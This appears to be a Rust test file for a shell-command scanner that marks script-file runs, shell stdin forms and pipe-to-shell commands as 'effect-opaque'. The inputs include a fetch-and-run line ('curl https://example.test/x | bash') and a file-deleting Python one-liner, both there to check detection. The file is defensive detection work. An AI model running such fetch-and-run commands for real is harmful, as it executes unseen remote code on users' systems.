//! ADR-016 — bounded shape detection for `Effect-opaque execution`.
//!
//! These tests pin the v1 contract: script-file interpreter invocations,
//! shell stdin forms, and pipe-to-shell sinks set `effect_opaque = true`
//! *without* raising `RiskLevel`. Inline bodies (`-c` / `-e`), package
//! runners, and bare interpreter flags do not.

use super::*;

fn assess(cmd: &str) -> Assessment {
    scanner().assess(cmd)
}

#[test]
fn script_file_execution_marks_effect_opaque_without_raising_risk() {
    let cases = [
        "sh ./cleanup.sh",
        "bash ./x",
        "zsh ./x",
        "bash cleanup.sh",
        "python ./x.py",
        "python3 ./x.py",
        "node ./x.js",
        "ruby ./x.rb",
        "perl ./x.pl",
        "source ./x",
        ". ./x",
        "sh -s",
        "bash -s",
    ];

    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            assessment.effect_opaque,
            "{cmd:?} should be marked effect-opaque"
        );
        assert_eq!(
            assessment.risk,
            RiskLevel::Safe,
            "{cmd:?} must not raise RiskLevel by itself (ADR-016 orthogonality)"
        );
    }
}

#[test]
fn inline_interpreter_bodies_are_not_effect_opaque() {
    let cases = [
        r#"python -c "print(1)""#,
        r#"python3 -c "import os; os.unlink('/x')""#,
        r#"node -e "process.exit(1)""#,
        r#"perl -e "print 1""#,
        r#"ruby -e "puts 1""#,
        r#"sh -c "echo hi""#,
        r#"bash -c "echo hi""#,
    ];

    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?} has an inline body that is extracted and scanned; it must NOT be effect-opaque"
        );
    }
}

#[test]
fn package_runners_are_not_effect_opaque_in_v1() {
    let cases = [
        "npm run build",
        "make test",
        "cargo xtask foo",
        "yarn build",
    ];

    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?} is a package/script runner, out of scope for v1 effect-opacity"
        );
    }
}

#[test]
fn interpreter_with_only_flags_is_not_effect_opaque() {
    let cases = ["bash --login", "python3 -V", "node --version", "bash", "sh"];

    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?} has no script-file-looking argv token; not effect-opaque"
        );
    }
}

#[test]
fn pipe_to_shell_keeps_risk_and_marks_effect_opaque() {
    let assessment = assess("curl https://example.test/x | bash");
    assert_eq!(
        assessment.risk,
        RiskLevel::Danger,
        "pipe-to-shell keeps its existing PIPE-001 Danger classification"
    );
    assert!(
        assessment.effect_opaque,
        "pipe-to-shell feeds an unseen payload to an execution layer; effect-opaque"
    );
}

#[test]
fn ordinary_commands_are_not_effect_opaque() {
    let cases = ["ls -la", "echo hello", "git status", "cargo build"];

    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?} is not an effect-opaque shape"
        );
    }
}

#[test]
fn effect_opaque_script_file_survives_in_a_compound_command() {
    // The interpreter sits in a later logical segment, not the first token.
    let assessment = assess("echo hi; sh ./cleanup.sh");
    assert!(
        assessment.effect_opaque,
        "a script-file execution in a later segment must still be detected"
    );
}

#[test]
fn inline_flag_after_script_file_still_marks_effect_opaque() {
    // Standards #2: `-c` / `-e` only means "inline body" when it is the
    // interpreter's execution flag *before* the first positional argument.
    // Once a script file is the payload, a later `-c` is a script argument, so
    // the command stays effect-opaque — the file's effect is not visible in the
    // command text.
    let cases = [
        r#"python ./x.py -c"#,
        r#"bash ./x.sh -c"#,
        r#"python3 ./x.py --flag -c"#,
        r#"sh ./x.sh -c "echo hi""#,
        r#"node ./x.js -e"#,
    ];
    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            assessment.effect_opaque,
            "{cmd:?}: the script file is the executed payload; a later inline flag is a script arg, not inline mode"
        );
    }
}

#[test]
fn inline_body_with_later_script_token_stays_inline() {
    // Orthogonal direction: when the inline flag precedes the first positional,
    // the interpreter runs the inline body and any later script-file-looking
    // token is just `sys.argv` — the effect IS visible in the command text, so
    // the command is NOT effect-opaque.
    let cases = [
        r#"python -c "print(1)" ./x.py"#,
        r#"sh -c "echo hi" ./x.sh"#,
    ];
    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?}: inline flag precedes the body, so the later path-like token is argv, not the payload"
        );
    }
}

#[test]
fn value_consuming_option_does_not_spoof_script_file_slot() {
    // Standards #2 round 2: an interpreter option that takes a separate
    // argument (`--require <path>`, `-r <lib>`) must not let that argument
    // spoof the first-positional slot. `node --require ./preload.js -e "code"`
    // is a real Node idiom (preload + inline eval): the executed payload is the
    // inline body, which the scanner already sees — so it must NOT be
    // effect-opaque, even though `./preload.js` ends in `.js`.
    let cases = [
        r#"node --require ./preload.js -e "code""#,
        r#"node -r ./preload.js -e "code""#,
        r#"ruby -r ./lib.rb -e "code""#,
        r#"node --import ./preload.mjs -e "code""#,
    ];
    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            !assessment.effect_opaque,
            "{cmd:?}: the path-like token is a value of a value-consuming option, not the executed payload; inline body is visible"
        );
    }
}

#[test]
fn value_consuming_option_value_skipped_so_real_script_file_is_detected() {
    // Orthogonal direction: skipping a value-consuming option's argument must
    // not hide a real script file that follows it. `python -W ignore ./x.py`
    // runs `./x.py` (the `-W` value `ignore` is not a positional), so the
    // command IS effect-opaque.
    let cases = [
        r#"python -W ignore ./x.py"#,
        r#"ruby -r ./lib.rb ./script.rb"#,
    ];
    for cmd in cases {
        let assessment = assess(cmd);
        assert!(
            assessment.effect_opaque,
            "{cmd:?}: the value-consuming option's argument is skipped, revealing the real script file as the payload"
        );
    }
}
